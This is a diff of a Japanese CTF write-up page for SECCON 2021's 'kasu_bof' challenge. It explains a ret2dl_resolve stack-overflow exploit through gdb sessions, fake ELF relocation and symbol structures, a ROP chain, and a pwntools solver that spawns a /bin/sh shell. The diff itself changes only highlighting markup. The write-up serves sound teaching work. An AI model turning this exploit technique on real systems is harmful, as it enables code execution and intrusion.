+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $symtab = (Elf32_Sym *)($link_map.l_info[6].d_un.d_ptr)
+gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
+gef➤  print $sym
+$13 = {
+st_name = 0x1a,
+st_value = 0x0,
+st_size = 0x0,
+st_info = 0x12,
+st_other = 0x0,
+st_shndx = 0x0
+}</code></pre></div>
 </div>
 </div>
 </div>
@@ -495,10 +495,10 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <div id="outline-text-headline-14" class="outline-text-5">
 <p><code>st_name</code> のオフセットを <code>.dynstr</code> セクションのアドレスに足し合わせたアドレスが、シンボルを指すアドレスとなっている。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  set $strtab = (char *)($link_map.l_info[5].d_un.d_ptr)
-</span></span><span style="display:flex;"><span>gef➤  set $gets_symbol = $strtab + $sym.st_name
-</span></span><span style="display:flex;"><span>gef➤  print $gets_symbol
-</span></span><span style="display:flex;"><span>$15 = 0x8048276 &#34;gets&#34;</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $strtab = (char *)($link_map.l_info[5].d_un.d_ptr)
+gef➤  set $gets_symbol = $strtab + $sym.st_name
+gef➤  print $gets_symbol
+$15 = 0x8048276 &#34;gets&#34;</code></pre></div>
 </div>
 <p>これにより、 <code>link_map</code> 構造体から <code>gets</code> のシンボルが解決されるまでの流れを把握することができた。</p>
 <p>
@@ -544,7 +544,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 </pre>
 <p>ここで、 <code>reloc_arg</code> にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 <code>.rel.plt</code> の値から偽の <code>Elf32_Rel</code> 構造体を配置したアドレスまでのオフセットを設定する。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  reloc_arg <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">-</span> rel</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  reloc_arg <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">-</span> rel</code></pre></div>
 </div>
 <p>
     また、偽の <code>Elf32_Rel</code> 構造体では、 <code>r_info</code> を 8 bitだけ右シフトした値を <code>.dynsym</code> を基準とした偽の <code>Elf32_Sym</code> 構造体へのインデックスとして使用する。
@@ -554,8 +554,8 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     <code>r_offset</code> は、解決されたアドレスが格納されるアドレスであり、通常はGOTの対応するエントリを指している。
     今回は特に関係ないものの、 <code>gets</code> の GOTエントリを指定しておく。    </p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  r_offset <span style="color:#f92672">=</span> gets_got
-</span></span><span style="display:flex;"><span>  r_info   <span style="color:#f92672">=</span> ((fake_elf32_sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  r_offset <span style="color:#f92672">=</span> gets_got
+  r_info   <span style="color:#f92672">=</span> ((fake_elf32_sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span></code></pre></div>
 </div>
 <p>
     <code>Elf32_Sym</code> 構造体の <code>st_name</code> は、 <code>.dynstr</code> の値から文字列 <code>&#34;system\x00&#34;</code> のアドレスまでのオフセットを設定する。
@@ -563,12 +563,12 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 <p>
     <code>st_info</code> は、グローバル関数であることを指す <code>0x12</code> を設定しておく必要があるため、設定しておく。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
-</span></span><span style="display:flex;"><span>  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
-</span></span><span style="display:flex;"><span>  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
+  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
+  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span></code></pre></div>
 </div>
 <div id="outline-container-headline-17" class="outline-5">
 <h5 id="headline-17">
@@ -604,13 +604,13 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 <p>
     Solverを書くときは、事前に <code>.bss</code> のどのアドレスがどの構造体やシンボルに対応するか計算しておき、ROPで <code>gets</code> の引数として指定しておき、ROPチェインが発火後に、それぞれの構造体やシンボルを書き込んでいく。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  fake_elf32_rel_addr <span style="color:#f92672">=</span> bss
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  fake_elf32_sym_addr <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  system_symbol_addr <span style="color:#f92672">=</span> fake_elf32_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  sh_string_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  fake_elf32_rel_addr <span style="color:#f92672">=</span> bss
+
+  fake_elf32_sym_addr <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+
+  system_symbol_addr <span style="color:#f92672">=</span> fake_elf32_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
+
+  sh_string_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span></code></pre></div>
 </div>
 </div>
 </div>
@@ -624,39 +624,39 @@ ROPチェインの作成
      そこで、 それぞれ計算しておいた領域に構造体を引数とし、 <code>gets@plt</code> にジャンプするROPを組む。
      x86のROPは、参考文献に挙げたセキュリティコンテストチャレンジブックが参考になる。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)          <span style="color:#75715e"># saved_ebp</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># main return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr) <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr) <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(system_symbol_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(system_symbol_addr)  <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(sh_string_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_string_addr)      <span style="color:#75715e"># gets arg</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># padding</span>
+ buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
+ buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)          <span style="color:#75715e"># saved_ebp</span>
+
+ <span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># main return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr) <span style="color:#75715e"># gets arg</span>
+
+ <span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr) <span style="color:#75715e"># gets arg</span>
+
+ <span style="color:#75715e"># gets(system_symbol_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(system_symbol_addr)  <span style="color:#75715e"># gets arg</span>
+
+ <span style="color:#75715e"># gets(sh_string_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(sh_string_addr)      <span style="color:#75715e"># gets arg</span></code></pre></div>
 </div>
 <p>
      それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 <code>.plt</code> セクションの先頭にジャンプする。
      このとき、 <code>system</code> の引数として <code>&#34;/bin/sh&#34;</code> を取れるように、 <code>&#34;/bin/sh&#34;</code> が格納されたアドレスをスタックに積んでおく。</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(plt)                 <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(reloc_arg)           <span style="color:#75715e"># reloc arg</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)          <span style="color:#75715e"># system return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_string_addr)      <span style="color:#75715e"># system arg</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
+ buf <span style="color:#f92672">+=</span> p32(plt)                 <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(reloc_arg)           <span style="color:#75715e"># reloc arg</span>
+ buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)          <span style="color:#75715e"># system return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(sh_string_addr)      <span style="color:#75715e"># system arg</span></code></pre></div>
 </div>
 </div>
 </div>
@@ -668,102 +668,102 @@ Solver
 </h4>
 <div id="outline-text-headline-19" class="outline-text-4">
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
-</span></span><span style="display:flex;"><span>chall <span style="color:#f92672">=</span> ELF(filename)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># docker-compose up</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># conn = remote(&#39;localhost&#39;, 9001)</span>
-</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> process(filename)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>bss <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.bss&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>rel <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.rel.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>dynsym <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynsym&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>dynstr <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynstr&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>gets_got <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
-</span></span><span style="display:flex;"><span>gets_plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;gets&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x08049022: pop ebx; ret;</span>
-</span></span><span style="display:flex;"><span>pop_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049022</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>fake_elf32_rel_addr <span style="color:#f92672">=</span> bss
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>fake_elf32_sym_addr <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>system_symbol_addr <span style="color:#f92672">=</span> fake_elf32_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># calc index of Elf32_Rel from .rel.plt</span>
-</span></span><span style="display:flex;"><span>reloc_arg <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">-</span> rel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                  <span style="color:#75715e"># fill stack</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)           <span style="color:#75715e"># saved_ebp</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># main return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr)  <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr)  <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(system_symbol_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(system_symbol_addr)   <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(sh_symbol_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)       <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(plt)                  <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(reloc_arg)            <span style="color:#75715e"># reloc arg</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)           <span style="color:#75715e"># system retrun addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)       <span style="color:#75715e"># system arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(buf)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># create Elf32_Rel</span>
-</span></span><span style="display:flex;"><span>r_offset <span style="color:#f92672">=</span> gets_got
-</span></span><span style="display:flex;"><span>r_info   <span style="color:#f92672">=</span> ((fake_elf32_sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>fake_elf32_rel <span style="color:#f92672">=</span> p32(r_offset)
-</span></span><span style="display:flex;"><span>fake_elf32_rel <span style="color:#f92672">+=</span> p32(r_info)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(fake_elf32_rel)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># create Elf32_Sym</span>
-</span></span><span style="display:flex;"><span>st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
-</span></span><span style="display:flex;"><span>st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
-</span></span><span style="display:flex;"><span>st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">=</span> p32(st_name)
-</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p32(st_value)
-</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p32(st_size)
-</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p8(st_info)
-</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p8(st_other)
-</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p16(st_shndx)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(fake_elf32_sym)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># create system symbol</span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># create sh symbol</span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+chall <span style="color:#f92672">=</span> ELF(filename)
+
+<span style="color:#75715e"># docker-compose up</span>
+<span style="color:#75715e"># conn = remote(&#39;localhost&#39;, 9001)</span>
+conn <span style="color:#f92672">=</span> process(filename)
+
+plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+bss <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.bss&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+rel <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.rel.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+dynsym <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynsym&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+dynstr <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynstr&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+gets_got <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
+gets_plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;gets&#39;</span>]
+
+<span style="color:#75715e"># 0x08049022: pop ebx; ret;</span>
+pop_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049022</span>
+
+fake_elf32_rel_addr <span style="color:#f92672">=</span> bss
+
+fake_elf32_sym_addr <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+
+system_symbol_addr <span style="color:#f92672">=</span> fake_elf32_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
+
+sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>
+
+<span style="color:#75715e"># calc index of Elf32_Rel from .rel.plt</span>
+reloc_arg <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">-</span> rel
+
+<span style="color:#75715e"># padding</span>
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                  <span style="color:#75715e"># fill stack</span>
+buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)           <span style="color:#75715e"># saved_ebp</span>
+
+<span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
+buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># main return addr</span>
+buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
